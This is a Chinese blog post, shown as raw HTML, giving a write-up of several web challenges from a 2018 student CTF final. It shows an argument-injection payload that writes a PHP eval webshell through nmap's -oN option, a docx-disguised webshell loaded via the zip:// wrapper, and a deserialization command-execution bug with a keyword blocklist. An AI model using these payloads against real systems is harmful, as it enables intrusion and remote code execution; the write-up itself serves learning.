@@ -1,0 +1,799 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.1">
+<meta name="baidu-site-verification" content="5ZQsOe30cm" />
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"southsea.st","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="首发于安恒网络空间安全讲武堂Orz。 太菜了只做出了几道水题，还是来赛后秒几题学习一下吧，水题就不赘述了。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2018 全国大学生软件测试大赛 安恒杯Web测试大赛 全国总决赛 部分题解">
+<meta property="og:url" content="https://southsea.st/2018-AH-National-Final/index.html">
+<meta property="og:site_name" content="南溟丷">
+<meta property="og:description" content="首发于安恒网络空间安全讲武堂Orz。 太菜了只做出了几道水题，还是来赛后秒几题学习一下吧，水题就不赘述了。">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2018-11-20T00:00:00.000Z">
+<meta property="article:modified_time" content="2021-02-02T04:11:18.106Z">
+<meta property="article:author" content="南溟丷">
+<meta property="article:tag" content="Web">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="反序列化">
+<meta property="article:tag" content="文件包含">
+<meta property="article:tag" content="文件上传">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://southsea.st/2018-AH-National-Final/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>2018 全国大学生软件测试大赛 安恒杯Web测试大赛 全国总决赛 部分题解 | 南溟丷</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">南溟丷</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">我想在那里最蓝的大海扬帆</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://southsea.st/2018-AH-National-Final/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="南溟丷">
+      <meta itemprop="description" content="我想在那里最蓝的大海扬帆">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="南溟丷">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          2018 全国大学生软件测试大赛 安恒杯Web测试大赛 全国总决赛 部分题解
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2018-11-20 00:00:00" itemprop="dateCreated datePublished" datetime="2018-11-20T00:00:00+00:00">2018-11-20</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E9%A2%98%E8%A7%A3/" itemprop="url" rel="index"><span itemprop="name">题解</span></a>
+                </span>
+            </span>
+
+          
+            <span id="/2018-AH-National-Final/" class="post-meta-item leancloud_visitors" data-flag-title="2018 全国大学生软件测试大赛 安恒杯Web测试大赛 全国总决赛 部分题解" title="热度">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">热度：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <!--
+      <span class="post-meta-item-text">Valine：</span>
+      -->
+      <span class="post-meta-item-text">评论数：</span>
+    
+    <a title="valine" href="/2018-AH-National-Final/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2018-AH-National-Final/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>首发于<a href="https://mp.weixin.qq.com/s?__biz=MzU1MzE3Njg2Mw==&mid=2247485858&idx=1&sn=836733960365613f30bef731e1bc6f9e&chksm=fbf793d2cc801ac4af4ea90579cc987f1ee1158c76b4617a374f0ff2a4888858385a1fae34d8&mpshare=1&scene=23&srcid=%23rd" target="_blank" rel="noopener">安恒网络空间安全讲武堂</a><strong>Orz</strong>。</p>
+<p>太菜了只做出了几道水题，还是来赛后秒几题学习一下吧，水题就不赘述了。</p>
+<a id="more"></a>
+
+<h3 id="在线工具"><a href="#在线工具" class="headerlink" title="在线工具"></a>在线工具</h3><p>先看源码。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"flag.php"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'host'</span>]))&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $host =(string)$_GET[<span class="string">'host'</span>];</span><br><span class="line">    $host=escapeshellarg($host);</span><br><span class="line">    $host=escapeshellcmd($host);</span><br><span class="line">    $sandbox = md5(<span class="string">"dbapp"</span>.$_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"you are in sandbox: "</span>.$sandbox.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    chdir($sandbox);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> system(<span class="string">"nmap -T5  -sT -Pn --host-timeout 2 -F  "</span>.$host);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;/pre&gt;"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="两个重要函数"><a href="#两个重要函数" class="headerlink" title="两个重要函数"></a>两个重要函数</h4><p>来看看官网给这两个函数的解释。</p>
+<h5 id="escapeshellarg"><a href="#escapeshellarg" class="headerlink" title="escapeshellarg"></a><a href="http://www.php.net/manual/zh/function.escapeshellarg.php" target="_blank" rel="noopener">escapeshellarg</a></h5><p>将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入<strong>shell</strong>函数，并且还是确保安全的。对于用户输入的部分参数就应该使用这个函数。<strong>shell</strong>函数包含<a href="http://php.net/manual/zh/function.exec.php" target="_blank" rel="noopener"><strong>exec()</strong></a>，<a href="http://php.net/manual/zh/function.system.php" target="_blank" rel="noopener"><strong>system()</strong></a>和<a href="http://php.net/manual/zh/language.operators.execution.php" target="_blank" rel="noopener">执行运算符</a>。</p>
+<p><strong>简单说来它的功能就是确保用户只传递一个参数给命令，用户不能指定更多的参数，用户不能执行不同的命令 。</strong></p>
+<h5 id="escapeshellcmd"><a href="#escapeshellcmd" class="headerlink" title="escapeshellcmd"></a><strong><a href="http://php.net/manual/zh/function.escapeshellcmd.php" target="_blank" rel="noopener">escapeshellcmd</a></strong></h5><p>对字符串中可能会欺骗<strong>shell</strong>命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到<a href="http://php.net/manual/zh/function.exec.php" target="_blank" rel="noopener"><strong>exec()</strong></a>或<a href="http://php.net/manual/zh/function.system.php" target="_blank" rel="noopener"><strong>system()</strong></a>函数，或者<a href="http://php.net/manual/zh/language.operators.execution.php" target="_blank" rel="noopener"><strong>执行运算符</strong></a>之前进行转义。</p>
+<p>在转义过程中，反斜线会在以下字符之前插入：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp; # ; ** | * ? ~ &lt; &gt; ^ ( ) [ ] &#123; &#125; $ \ \x0A \xFF</span><br></pre></td></tr></table></figure>
+
+<p>而<strong>‘</strong>和<strong>“</strong>仅在不配对的时候被转义，在<strong>Windows</strong>平台上，所有这些字符以及<strong>%</strong>和<strong>!</strong>字符都会被空格代替。</p>
+<p><strong>简单说来它的功能就是确保用户只执行一个命令，用户可以指定不限数量的参数，用户不能执行不同的命令。</strong></p>
+<h4 id="一个简单结论"><a href="#一个简单结论" class="headerlink" title="一个简单结论"></a>一个简单结论</h4><p>对于单个单引号，<strong>escapeshellarg</strong>函数转义后，还会在被转义字符的左右字符串各加一个单引号进行连接，而<strong>escapeshellcmd</strong>函数是直接转义。对于成对的单引号，<strong>escapeshellcmd</strong>函数不转义，但<strong>escapeshellarg</strong>函数转义。</p>
+<h4 id="一个简单举例"><a href="#一个简单举例" class="headerlink" title="一个简单举例"></a>一个简单举例</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line">    $host = <span class="string">"127.0.0.1' -v -d a=1"</span>;</span><br><span class="line">    <span class="keyword">echo</span> $host.<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">    $host=escapeshellarg($host);</span><br><span class="line">    <span class="keyword">echo</span> $host.<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">    $host=escapeshellcmd($host);</span><br><span class="line">    <span class="keyword">echo</span> $host.<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>打印出的字符串如下。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1&#39; -v -d a&#x3D;1</span><br><span class="line">&#39;127.0.0.1&#39;\&#39;&#39; -v -d a&#x3D;1&#39;</span><br><span class="line">&#39;127.0.0.1&#39;\\&#39;&#39; -v -d a&#x3D;1\&#39;</span><br></pre></td></tr></table></figure>
+
+<p>分解一下，首先<strong>escapeshellarg</strong>函数先对单引号转义，再用单引号将原单引号左右两部分括起来从而起到连接的作用。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;127.0.0.1&#39;\&#39;&#39; -v -d a&#x3D;1&#39;</span><br></pre></td></tr></table></figure>
+
+<p>然后<strong>escapeshellcmd</strong>函数对不成对单引号和反斜杠转义，即得到如下字符串。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;127.0.0.1&#39;\\&#39;&#39; -v -d a&#x3D;1\&#39;</span><br></pre></td></tr></table></figure>
+
+<p>最终字符串被分割成三个部分。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#39;127.0.0.1&#39;</span><br><span class="line">\\</span><br><span class="line">&#39;&#39; </span><br><span class="line">-v -d </span><br><span class="line">a&#x3D;1\&#39;</span><br></pre></td></tr></table></figure>
+
+<p>但是如果是先用<strong>escapeshellcmd</strong>函数，再用的<strong>escapeshellarg</strong>函数，则不会发生这个问题。</p>
+<h4 id="赛题详解"><a href="#赛题详解" class="headerlink" title="赛题详解"></a>赛题详解</h4><p>再来看看题目。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"flag.php"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'host'</span>]))&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $host =(string)$_GET[<span class="string">'host'</span>];</span><br><span class="line">    $host=escapeshellarg($host);</span><br><span class="line">    $host=escapeshellcmd($host);</span><br><span class="line">    $sandbox = md5(<span class="string">"dbapp"</span>.$_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"you are in sandbox: "</span>.$sandbox.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    chdir($sandbox);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> system(<span class="string">"nmap -T5  -sT -Pn --host-timeout 2 -F  "</span>.$host);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;/pre&gt;"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>只需要在要执行的恶意代码两边加上分号即可绕过。</p>
+<p>并且此处需要用到<strong>nmap</strong>的<strong>-oN</strong>指令，将标准输出直接写入指定的文件。</p>
+<p>先上<strong>Payload</strong>。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39; &lt;?php eval($_POST[1]);?&gt; -oN shell.php &#39;</span><br></pre></td></tr></table></figure>
+
+<p>第一次先经过<strong>escapeshellarg</strong>函数，先对左右两边的单引号进行转义，然后分别对原单引号即现在斜杆加单引号的左右两边再次加上单引号进行字符串连接，得到如下字符串。【为直观观看特意做了空格区分。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;&#39;     \&#39;     &#39; -oN shell.php &#39;     \&#39;     &#39;&#39;</span><br></pre></td></tr></table></figure>
+
+<p>然后第二次使用<strong>escapeshellcmd</strong>函数，对斜杆和单个单引号进行转义。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;&#39;     \\     &#39;&#39;     \&lt;\?php eval\(\$_POST\[1\]\)\;\?\&gt;     -oN     shell.php     &#39;\\&#39;     &#39;&#39;</span><br></pre></td></tr></table></figure>
+
+<p>那么最后可以看到字符串被单引号分割成了多份，而最终指令如下。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T5  -sT -Pn --host-timeout 2 -F &#39;&#39;     \\     &#39;&#39;     \&lt;\?php eval\(\$_POST\[1\]\)\;\?\&gt;     -oN     shell.php     &#39;\\&#39;     &#39;&#39;</span><br></pre></td></tr></table></figure>
+
+<p>删除不必要的东西之后得到如下指令。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T5  -sT -Pn --host-timeout 2 -F \&lt;\?php eval\(\$_POST\[1\]\)\;\?\&gt; -oN shell.php</span><br></pre></td></tr></table></figure>
+
+<p>即指令目的就是对<strong>&lt;?php</strong>和<strong>eval($_POST[1]);?&gt;</strong>进行扫描，并将结果存入<strong>shell.php</strong>。</p>
+<p>通过这一指令可以将<strong>shell</strong>写入，从而连上小🐎。</p>
+<p>需要一提的是<strong>mac</strong>本地用的<strong>nmap7.70</strong>和<strong>php5.5.38</strong>版本没有复现成功，可能还有别的环境的问题。</p>
+<p>放在自己的<strong>vps</strong>上用<strong>nmap7.01</strong>和<strong>php5.4.16</strong>成功复现了【我就做出了这题Orz。</p>
+<h3 id="黑产了解一下？"><a href="#黑产了解一下？" class="headerlink" title="黑产了解一下？"></a>黑产了解一下？</h3><p>赛后秒题开始<strong>XD</strong>。</p>
+<p>似乎是<strong>QCTF</strong>【<strong>XMAN</strong>选拔赛的题。</p>
+<p>在交易市场有<strong>9999999</strong>买<strong>flag</strong>以及<strong>5000000</strong>买<strong>hint</strong>。</p>
+<p>在抽奖界面抓包会发现发送了<strong>Json</strong>数据，直接用<strong>true</strong>绕过。【我赛后翻<strong>Writeup</strong>说是有一个<strong>git</strong>泄漏代码审计发现这个弱类型判断，但是比赛的时候好像没有扫到这个<strong>git</strong>泄漏Orz。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;action&quot;:&quot;buy&quot;,&quot;numbers&quot;:[true,true,true,true,true,true,true]&#125;</span><br></pre></td></tr></table></figure>
+
+<p>似乎没有办法把钱弄到<strong>9999999</strong>，那只好买<strong>hint</strong>，需要一提的是网页上的购买<strong>hint</strong>按钮是假的，点击没有反应，只好<strong>Burpsuite</strong>发包购买。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;action&quot;:&quot;hint&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>Post</strong>发送如上请求后返回一个<strong>admin pass isQWERTYUIOPASDFGHJKL</strong>的字符串，应该是需要用这个<strong>pass</strong>的密码去注册<strong>admin</strong>账号，登陆后多了一个上传页面。</p>
+<p>这儿只能上传<strong>doc</strong>和<strong>docx</strong>，测试后发现校验了后缀名、<strong>Mime</strong>、文件头。</p>
+<p>且这里有一个文件包含，后缀会添加<strong>php</strong>。</p>
+<p>然后由于<strong>doc</strong>和<strong>zip</strong>的文件头一样，因此构造一句话木马打包后，<strong>Burpsuite</strong>抓包修改后缀名和<strong>Mime</strong>类型上传，最后使用<strong>zip</strong>伪协议读取即可。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page&#x3D;zip:&#x2F;&#x2F;uploads&#x2F;e65eee3bd3f975947e589d1e6ae279ccdf31fb3e.docx%23south</span><br></pre></td></tr></table></figure>
+
+<p>其中的<strong>south</strong>是小马的名字，以及这里需要一提的是<strong>uploads</strong>这个目录下的<strong>flag</strong>是假的，这里需要使用<strong>find</strong>命令来寻找<strong>flag</strong>，最后是在<strong>/etc/flag</strong>这个路径找到<strong>flag</strong>。</p>
+<h3 id="不知名的小站"><a href="#不知名的小站" class="headerlink" title="不知名的小站"></a>不知名的小站</h3><p>这题在比赛的时候就发现了一个反序列化漏洞，但是没找到<strong>class</strong>函数，后来在月赛群里和师傅们聊的时候有提及说题目提示<strong>hint</strong>，<strong>hint.txt</strong>提示断电，然后联想到<strong>.hint.txt.swp</strong>，然后就有一个源码泄漏。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">verify</span><span class="params">($name,$location)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">empty</span>($name))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"&lt;script =\"JavaScript\"&gt; alert('请先登录！');self.location='$location';&lt;/script&gt;"</span>);</span><br><span class="line">        &#125;       </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">info</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $name;</span><br><span class="line">        <span class="keyword">public</span> $ages;</span><br><span class="line">        <span class="keyword">public</span> $cmd;   </span><br><span class="line">        <span class="keyword">public</span> $black_str;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">say_name</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">say_ages</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;ages;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">safe</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;black_str = <span class="string">'ls| |&#123;I|;|%0a|cat|flag|find|&amp;|&lt;'</span>;</span><br><span class="line">        $check = eregi(<span class="keyword">$this</span>-&gt;black_str,$str);</span><br><span class="line">        <span class="keyword">return</span> $check;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $check = <span class="keyword">$this</span>-&gt;safe(<span class="keyword">$this</span>-&gt;cmd);</span><br><span class="line">        <span class="keyword">if</span>($check)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"&lt;script language=\"JavaScript\"&gt; alert('您的内容含有字符非法！'); self.location='./index.php'; &lt;/script&gt; "</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        @system(<span class="keyword">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>然后在注册登陆后抓包可以看到<strong>POST</strong>了一个反序列化的字符串上去。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;info&quot;:4:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:4:&quot;ages&quot;;s:2:&quot;12&quot;;s:3:&quot;cmd&quot;;N;s:9:&quot;black_str&quot;;N;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>根据源码泄漏构造绕过，<strong>eregi</strong>可以使用<strong>%00</strong>截断绕过，其他内容和些许不足有错误遗漏的地方由于赛后秒题环境缺失无法复现，因此不能详细补充纠正这篇文章Orz。</p>
+<h3 id="Refer"><a href="#Refer" class="headerlink" title="Refer"></a>Refer</h3><p><a href="http://www.lmxspace.com/2018/07/16/%E8%B0%88%E8%B0%88escapeshellarg%E5%8F%82%E6%95%B0%E7%BB%95%E8%BF%87%E5%92%8C%E6%B3%A8%E5%85%A5%E7%9A%84%E9%97%AE%E9%A2%98/" target="_blank" rel="noopener">谈谈escapeshellarg参数绕过和注入的问题</a></p>
+<p><a href="http://www.52bug.cn/%E9%BB%91%E5%AE%A2%E6%8A%80%E6%9C%AF/4879.html" target="_blank" rel="noopener">利用/绕过 PHP escapeshellarg/escapeshellcmd函数</a></p>
+<p><a href="http://v0w.top/2018/04/21/SKCTF2-wp/" target="_blank" rel="noopener">SKCTF2</a></p>
+<p><a href="https://github.com/jiangsir404/Audit-Learning/blob/master/escapeshellarg%20%E5%92%8C%20escapeshellcmd%20%E5%87%BD%E6%95%B0.md" target="_blank" rel="noopener">escapeshellarg 和 escapeshellcmd 函数</a></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/Web/" rel="tag"><i class="fa fa-tag"></i> Web</a>
+              <a href="/tags/CTF/" rel="tag"><i class="fa fa-tag"></i> CTF</a>
+              <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag"><i class="fa fa-tag"></i> 反序列化</a>
+              <a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" rel="tag"><i class="fa fa-tag"></i> 文件包含</a>
